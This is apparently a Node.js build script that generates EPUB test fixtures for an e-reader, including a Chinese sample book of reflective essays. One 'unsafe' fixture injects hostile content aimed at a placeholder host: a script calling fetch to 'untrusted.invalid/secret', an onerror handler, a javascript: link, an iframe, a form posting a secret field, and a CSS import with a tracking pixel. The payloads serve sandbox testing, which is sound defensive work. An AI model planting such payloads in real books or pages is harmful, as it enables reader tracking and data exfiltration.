import { mkdir, writeFile } from 'node:fs/promises';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { zipSync, strToU8 } from 'fflate';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const esc = value => value.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;');

const landscape = `<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="560" viewBox="0 0 1200 560"><defs><linearGradient id="sky" x2="0" y2="1"><stop stop-color="#dce9df"/><stop offset="1" stop-color="#f4eedc"/></linearGradient></defs><rect width="1200" height="560" fill="url(#sky)"/><circle cx="890" cy="145" r="56" fill="#e6cd90"/><path d="M0 370 Q170 150 360 340 Q550 150 740 310 Q970 130 1200 300 V560H0Z" fill="#a9bba1"/><path d="M0 430 Q240 250 450 420 Q670 240 900 370 Q1080 300 1200 370V560H0Z" fill="#6c8a71"/><path d="M0 500 Q230 380 460 470 Q700 390 910 470 Q1080 410 1200 455V560H0Z" fill="#425f4b"/><path d="M600 560 Q760 480 690 400 Q640 360 740 323" stroke="#dbe3ce" stroke-width="19" fill="none"/><path d="M160 425V303m-32 50 32-70 32 70m-42-24 10-45 13 45" fill="none" stroke="#385442" stroke-width="14" stroke-linecap="round"/><path d="M1030 370V250m-30 45 30-65 30 65" fill="none" stroke="#425f4b" stroke-width="13" stroke-linecap="round"/></svg>`;
const cover = `<svg xmlns="http://www.w3.org/2000/svg" width="600" height="840" viewBox="0 0 600 840"><rect width="600" height="840" fill="#dce7d4"/><rect x="26" y="26" width="548" height="788" rx="2" fill="none" stroke="#94a98f"/><path d="M0 630 Q170 430 310 575 Q440 450 600 560V840H0Z" fill="#9eb497"/><path d="M0 740 Q170 550 350 715 Q470 620 600 690V840H0Z" fill="#53745b"/><circle cx="447" cy="440" r="48" fill="#eee4bf"/><text x="74" y="116" fill="#56705a" font-size="16" letter-spacing="7">A QUIET READING</text><text x="72" y="235" fill="#344f3c" font-size="53" font-family="serif">把日子</text><text x="72" y="315" fill="#344f3c" font-size="53" font-family="serif">读成诗</text><path d="M76 362H152" stroke="#8a9e7e" stroke-width="2"/><text x="76" y="401" fill="#5c725c" font-size="19" font-family="serif">阅野编辑部</text><text x="76" y="774" fill="#e5eddd" font-size="15" letter-spacing="5">在平常的风景里，重新看见生活</text></svg>`;

const chapters = [
  {
    title: '第一章 · 把清晨还给自己', id: 'morning', sections: [
      ['window', '窗边的一小段时间', [
        '天刚亮，城市还没有完全醒来。窗玻璃上有一层很薄的雾，街对面的树被晨光描出柔软的边。我把手机扣在桌上，给自己倒了一杯温水。水里没有茶叶，也没有什么值得记录的仪式，只是觉得今天可以从一件慢一点的事开始。',
        '从前总以为，只有空出一整天才能认真生活。后来才发现，一天并不是一整块等人安排的石头，它有许多细小的缝隙。等水烧开的几分钟，出门以前的一口呼吸，翻到一半还舍不得合上的书页，都是可以走进去的地方。',
        '窗边的小木桌有一道浅浅的划痕，是搬家那天留下的。我曾想用桌布遮住它，如今反而喜欢那条不够平整的线。它提醒我，日子被使用过，总会留下痕迹；一件东西值得珍惜，也并不因为它始终完好。',
        '楼下早餐店的蒸汽升起来了。骑车的人把围巾往上拉了拉，清洁工推着车经过斑马线，有人提着纸袋给路边的猫添食。这些事情很小，没有一件会出现在新闻里，可它们一件挨着一件，把一座城市托到了早晨。',
        '我读了两页书，遇到一句想抄下来的话，又停住了笔。此刻不必把所有喜欢的东西都据为己有。有些句子像经过窗前的鸟，听见过就好。读书也可以没有目标，不为完成，不为分享，只为了在别人的语言中安静坐一会儿。',
      ]],
      ['slow', '让今天慢一点开始', [
        '有时，清晨最好的安排是少安排一点。把窗打开，让风把昨夜的空气带走；看一眼杯底的光，再穿好外套。我们并非每时每刻都要成为更好的自己，也可以先成为一个听得见自己的人。',
        '我开始练习在出门之前留出十分钟。那十分钟不够做出什么漂亮成绩，却足够找到钥匙，整理衣领，也足够对今天说一句：慢慢来。时间没有增加，心里却不像过去那样拥挤了。',
        '后来我发现，所谓从容，往往不是拥有很多空闲，而是允许一件事有自己的速度。米粥要煮开，树叶要转黄，一封认真写的回信也要等到语气妥帖。人亦如此，不能只靠催促生长。',
        '如果今天只来得及做一件温柔的小事，我愿意把它放在清晨。因为一日的开头，并非只能是闹钟和待办清单。它还可以是一束光、一口热水，以及从书页里抬头时，看见的那片天。',
      ]],
    ],
  },
  {
    title: '第二章 · 沿着河走到黄昏', id: 'river', sections: [
      ['path', '一条不赶时间的路', [
        '河边有一条很窄的步道。白天自行车和行人轮流借过，到了傍晚，影子就先走在人的前面。我通常不戴耳机，听鞋底落在石板上的声音。沿路的树没有名字也没关系，认识一个地方，可以先从愿意一次次经过它开始。',
        '水面并非一直平静。桥下偶尔有船经过，细碎的波纹一层推着一层，像有人把很远的消息慢慢送到岸边。坐在台阶上的老人收起鱼竿，孩子蹲着看一片叶子打转。没有人要求那片叶子尽快抵达哪里。',
        '我想起小时候，放学回家的路总比上学时长。不是路变长了，而是沿途可以停下来的事情太多：新开的花、墙缝里的蚂蚁、晒在竹筛里的橘皮。那时我们还没有学会把经过变成赶往，也没有把每一条路都只看作两点之间的距离。',
        '长大之后，我们熟悉了最近路线和预计用时，却常常想不起自己上一次抬头看云是什么时候。河边的路教我重新学着绕远一点。走得慢，不一定耽误事情；也许只是把遗漏的自己重新接上。',
        '路尽头有一棵低矮的树，枝叶一直伸向水面。有一天我发现，风吹过的时候，叶子和倒影朝着相反的方向晃动。原来同一件事，可以在两个世界里拥有不同的姿态。我站在那里看了很久，直到天色一点一点暗下来。',
      ]],
      ['dusk', '黄昏把边界变柔软', [
        '太阳落山以前，城市短暂地换了一种颜色。玻璃楼不再显得那么坚硬，屋顶上的天线也像一笔草草写下的字。白天里分得清楚的事，此刻都愿意退后一点，让远处的山和近处的人站在同一幅画里。',
        '有人带着狗沿河慢跑，有人靠在栏杆边给家里打电话。我听见一句很普通的话：“快到了，留点汤给我。”就是这样一句话，让整条路忽然有了可以抵达的方向。',
        '回去时，街灯已经亮了。我没有走得比来时更快，也不急着把这趟散步解释成锻炼、放松或寻找灵感。有些事情的意义就在事情本身。沿着河走到黄昏，已是一件完整的事。',
        '假如某一天觉得心里的声音太大，不妨找一条有树、有水或者只是有晚风的路。把自己交给脚步一会儿。你不必立刻找到答案，先走过这一小段，也许就会知道下一步该怎样落下。',
      ]],
    ],
  },
  {
    title: '第三章 · 给平常事留一盏灯', id: 'light', sections: [
      ['table', '一顿简单的晚饭', [
        '我喜欢做饭以前先把桌子擦干净。不是为了拍照，而是想给即将坐下的人腾出一块舒服的地方。饭菜可以简单：一碗汤，一盘青菜，一小碟昨天剩下的豆子。热气升起来的时候，屋子就不再只是一个可以睡觉的地址。',
        '厨房的灯比客厅暖一些。切菜的声音、锅盖轻轻碰到灶台的声音，以及邻居家传来的电视声混在一起，是傍晚很熟悉的底色。每到这时，白天那些需要反复解释的事，似乎都可以先放在门外。',
        '有一次汤煮咸了，我正懊恼，对面的人却说，可以再加点水。那句话很平常，却让我笑了出来。原来许多失误不需要郑重其事地证明什么，有时只需找到一只更大的碗，多留一点余地。',
        '我们常常把照顾理解成很了不起的付出，其实它也藏在微小的预备里。给晚回来的人留一盏灯，把杯子放在容易够到的地方，知道谁不吃葱，记得一盆花上次浇水是什么时候。没有掌声，也照样可以认真。',
        '吃完饭，我不马上收走所有碗筷。让人再坐一会儿，聊聊今天遇见的树、错过的车，还有一句没想明白的话。桌子并不急着恢复整齐，生活有时候需要一点没有目的的停留。',
      ]],
      ['letters', '那些尚未寄出的句子', [
        '书柜最下面有一个纸盒，里面放着旧票根和几封没有寄出的信。它们不都因为遗憾留下，有些只是写完以后才发现，对方已经从另一件小事里知道了我的心意。',
        '写信让我学会把话说慢一点。第一遍写出的通常是情绪，第二遍才慢慢出现想表达的意思。删掉过重的词，也删掉不必要的解释，最后留在纸上的，往往比最初想说的短得多。',
        '如果不知道如何开始，可以从一件具体的事写起：今天经过你喜欢的花店，或者刚煮的粥冒出了一个很大的泡泡。人与人之间的连接，有时不需要宏大的消息，只需一句“我在这里，也想到了你”。',
        '灯亮着，水壶里还有温水，窗外的车声渐渐疏了。一天并没有被过得特别漂亮，却被好好安放了。平常事之所以值得反复去做，也许正因为它们给了我们一种可以信任的明天。',
      ]],
    ],
  },
  {
    title: '第四章 · 一本书的留白', id: 'book', sections: [
      ['margin', '在页边留下自己的声音', [
        '旧书上偶尔会留下前一位读者的铅笔线。有的划得很直，有的只在句尾点了一下。我不知道那个人是谁，也不知道他在怎样的一天读到这里，却能想象某个瞬间，他也曾停下来。',
        '阅读并非把一页页文字完整地搬进脑子。更多时候，是某个词碰到了生活里尚未说清的感受，于是书页和我们之间有了一次很轻的回应。做笔记，是给那次回应留一把椅子。',
        '我不再要求每一本书都读到底，也不要求每一条笔记都成为见解。有时记下“这里让我想起外婆家的窗”，就足够了。笔记先属于写下它的人，之后才可能成为别人的参考。',
        '换一个季节重读，同样的句子会显出不同的意思。那些曾经急着划下来的段落，可能不再最重要；而以前轻轻略过的地方，却忽然让人久久舍不得翻页。书没有改变，是日子替我们添了新的注脚。',
        '留白不是空缺。它是允许自己暂时没有答案，是给下一次阅读留下入口，也是承认有些感受只能慢慢长出来。读得少一点，想得久一点，并不比匆匆完成一长串书单更差。',
      ]],
      ['tomorrow', '把下一页交给明天', [
        '睡前合上书，屋子里便安静下来。我把书签夹在一段尚未结束的对话旁，让故事停在那里，像窗外一盏还没有熄灭的灯。明天再回来，人物还会在原处等我。',
        '读书让时间有了另一种刻度。我们记得某年夏天读过的一首诗，记得搬家那晚纸箱上摊开的小说，记得一段特别难过的日子里，有一本书陪着自己走完几站地铁。',
        '若要给这本小书写一句结尾，我想写：愿你有自己的窗，有可以慢慢走的路，有愿意为你留灯的人，也有一页不必赶着读完的书。日子很长，请把其中一些时刻还给自己。',
        '故事结束了，生活还在继续。下一次清晨，你也许仍要赶路，仍会忘记带伞，仍有许多一时理不清的事。但只要愿意停一小会儿，普通日子里就总有一行属于你的诗。',
      ]],
    ],
  },
];

function xhtml(title, body) {
  return `<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" lang="zh-CN"><head><title>${esc(title)}</title><link rel="stylesheet" href="../Styles/book.css"/></head><body>${body}</body></html>`;
}

export function createEpub({ title = '把日子读成诗', version = '3.0', navigation = true, malicious = false } = {}) {
  const entries = {};
  const add = (name, value) => { entries[name] = strToU8(value); };
  entries.mimetype = [strToU8('application/epub+zip'), { level: 0 }];
  add('META-INF/container.xml', '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>');
  add('OEBPS/Images/cover.svg', cover);
  add('OEBPS/Images/river.svg', landscape);
  add('OEBPS/Styles/book.css', `body{font-family:serif;color:#354435;line-height:1.8}h1{font-size:1.7em;line-height:1.4;font-weight:500;margin:1.2em 0 1.7em}h2{font-size:1.1em;font-weight:500;margin:2em 0 1em}p{text-indent:2em;margin:0 0 1em;text-align:justify}figure{margin:1.5em 0}img{max-width:100%;height:auto}figcaption{font-size:.7em;text-align:center;color:#7c8876}a{color:#59775a}aside{font-size:.85em;border-top:1px solid #ddd;padding-top:1em}.title{text-align:center;padding-top:4em}.title p{text-indent:0;text-align:center}.eyebrow{font-size:.65em;letter-spacing:.3em}${malicious ? '@import "https://untrusted.invalid/book.css"; body{background-image:url(https://untrusted.invalid/track.png)}' : ''}`);
  add('OEBPS/Text/title.xhtml', xhtml(title, `<div class="title"><p class="eyebrow">A QUIET READING · 阅野原创样书</p><h1>${esc(title)}</h1><p>阅野编辑部</p><figure><img src="../Images/river.svg" alt="晚风里的青山与河流"/></figure><p>在平常的风景里，重新看见生活。</p><p style="font-size:.75em">这是一本用于体验阅读器的原创样书。<br/>你可以自由试用目录、书签、笔记和阅读设置。</p></div>`));
  chapters.forEach((chapter, index) => {
    let body = `<h1 id="${chapter.id}">${esc(chapter.title)}</h1>`;
    chapter.sections.forEach(([id, heading, paragraphs], section) => {
      body += `<h2 id="${id}">${esc(heading)}</h2>`;
      body += paragraphs.map((paragraph, pi) => `<p id="p-${index}-${section}-${pi}">${esc(paragraph)}</p>`).join('');
      // A second, distinct reflection makes the sample long enough to exercise real pagination.
      body += `<p>我在这里停了一下，重新看了看${index === 0 ? '窗外的晨光' : index === 1 ? '河面上的晚霞' : index === 2 ? '桌角那盏灯' : '尚未读完的书页'}。许多时候，我们缺少的并非一段更长的时间，而是把注意力放回眼前的勇气。眼前有具体的颜色、声音和温度，也有正在发生的自己。愿意看见这些，就已经是在认真地过这一天。</p>`;
      body += `<p>这份练习不需要每天做得一样好。有时心浮气躁，有时忙得只能匆匆经过，都没有关系。生活不是一张等待勾满的表格，阅读也一样。允许偶尔走神，允许忘记上一页的内容，再从此刻重新开始。只要书还在手边，路就没有真正中断。</p>`;
    });
    if (index === 1) body += '<figure><img src="../Images/river.svg" alt="青山、河流和一条安静的小路"/><figcaption>沿着河走，直到暮色落在肩上。</figcaption></figure>';
    if (index === 0) body += '<p>关于这个清晨，还有一则<a epub:type="noteref" href="#note-1">小小的注脚〔1〕</a>。也可以沿着目录，去看看<a href="chapter2.xhtml#river">第二章的那条河</a>。</p><aside id="note-1" epub:type="footnote"><p>〔1〕清晨不必是某个精确的钟点，它也可以是你愿意重新开始的时刻。<a href="#morning">返回章首</a></p></aside>';
    if (malicious && index === 0) body += '<script>window.__epubScriptExecuted=true;fetch("https://untrusted.invalid/secret")</script><img src="https://untrusted.invalid/pixel" onerror="window.__epubEventExecuted=true"/><a href="javascript:alert(1)">危险链接</a><iframe src="https://untrusted.invalid/embed"></iframe><form action="https://untrusted.invalid/submit"><input name="secret"/></form>';
    add(`OEBPS/Text/chapter${index + 1}.xhtml`, xhtml(chapter.title, body));
  });
  const navItems = chapters.map((chapter, index) => `<li><a href="Text/chapter${index + 1}.xhtml#${chapter.id}">${esc(chapter.title)}</a><ol>${chapter.sections.map(([id, heading], si) => `<li><a href="Text/chapter${index + 1}.xhtml#${id}">${esc(heading)}</a>${index === 0 && si === 0 ? '<ol><li><a href="Text/chapter1.xhtml#p-0-0-2">木桌上的一道划痕</a></li></ol>' : ''}</li>`).join('')}</ol></li>`).join('');
  if (version.startsWith('3') && navigation) add('OEBPS/nav.xhtml', xhtml('目录', `<nav epub:type="toc" id="toc"><h1>目录</h1><ol><li><a href="Text/title.xhtml">扉页</a></li>${navItems}</ol></nav>`).replace('href="../Styles/book.css"', 'href="Styles/book.css"'));
  if (version.startsWith('2') && navigation) {
    let playOrder = 1;
    const points = chapters.map((c, i) => `<navPoint id="ch${i}" playOrder="${++playOrder}"><navLabel><text>${esc(c.title)}</text></navLabel><content src="Text/chapter${i + 1}.xhtml#${c.id}"/>${c.sections.map(([id, heading], si) => `<navPoint id="ch${i}s${si}" playOrder="${++playOrder}"><navLabel><text>${esc(heading)}</text></navLabel><content src="Text/chapter${i + 1}.xhtml#${id}"/></navPoint>`).join('')}</navPoint>`).join('');
    add('OEBPS/toc.ncx', `<?xml version="1.0" encoding="utf-8"?><ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1"><head><meta name="dtb:uid" content="yueye-original-sample"/></head><docTitle><text>${esc(title)}</text></docTitle><navMap><navPoint id="cover" playOrder="1"><navLabel><text>扉页</text></navLabel><content src="Text/title.xhtml"/></navPoint>${points}</navMap></ncx>`);
  }
  const navigationManifest = !navigation ? '' : version.startsWith('3') ? '<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>' : '<item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>';
  add('OEBPS/content.opf', `<?xml version="1.0" encoding="utf-8"?><package xmlns="http://www.idpf.org/2007/opf" unique-identifier="uid" version="${version}"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="uid">urn:yueye:original-sample:${version}:${navigation}:${malicious}</dc:identifier><dc:title>${esc(title)}</dc:title><dc:creator>阅野编辑部</dc:creator><dc:language>zh-CN</dc:language><dc:description>一册关于清晨、散步、灯光与阅读的原创小书。</dc:description><meta property="dcterms:modified">2026-10-29T16:00:00Z</meta><meta name="cover" content="cover-image"/><meta property="rendition:layout">reflowable</meta></metadata><manifest><item id="titlepage" href="Text/title.xhtml" media-type="application/xhtml+xml"/>${chapters.map((_, i) => `<item id="chapter${i + 1}" href="Text/chapter${i + 1}.xhtml" media-type="application/xhtml+xml"/>`).join('')}<item id="css" href="Styles/book.css" media-type="text/css"/><item id="cover-image" href="Images/cover.svg" media-type="image/svg+xml" properties="cover-image"/><item id="landscape" href="Images/river.svg" media-type="image/svg+xml"/>${navigationManifest}</manifest><spine${version.startsWith('2') && navigation ? ' toc="ncx"' : ''}><itemref idref="titlepage"/>${chapters.map((_, i) => `<itemref idref="chapter${i + 1}"/>`).join('')}</spine></package>`);
  return zipSync(entries, { level: 6, mtime: new Date('2026-10-29T16:00:00Z') });
}

await mkdir(resolve(root, 'tests/fixtures'), { recursive: true });
await mkdir(resolve(root, 'public'), { recursive: true });
const fixtures = [
  ['public/demo.epub', createEpub()],
  ['tests/fixtures/epub3.epub', createEpub()],
  ['tests/fixtures/epub2.epub', createEpub({ title: 'EPUB 2 兼容样书', version: '2.0' })],
  ['tests/fixtures/no-toc.epub', createEpub({ title: '无目录兼容样书', navigation: false })],
  ['tests/fixtures/unsafe.epub', createEpub({ title: '安全隔离测试', malicious: true })],
  ['tests/fixtures/same-title.epub', createEpub({ title: '把日子读成诗', version: '2.0' })],
  ['tests/fixtures/corrupt.epub', strToU8('This is deliberately not a ZIP archive.')],
  ['tests/fixtures/missing-opf.epub', zipSync({mimetype:strToU8('application/epub+zip'),'META-INF/container.xml':strToU8('<container><rootfiles><rootfile full-path="missing.opf"/></rootfiles></container>')})],
];
for (const [file, bytes] of fixtures) {
  await writeFile(resolve(root, file), bytes);
  process.stdout.write(`${file}: ${bytes.length} bytes\n`);
}
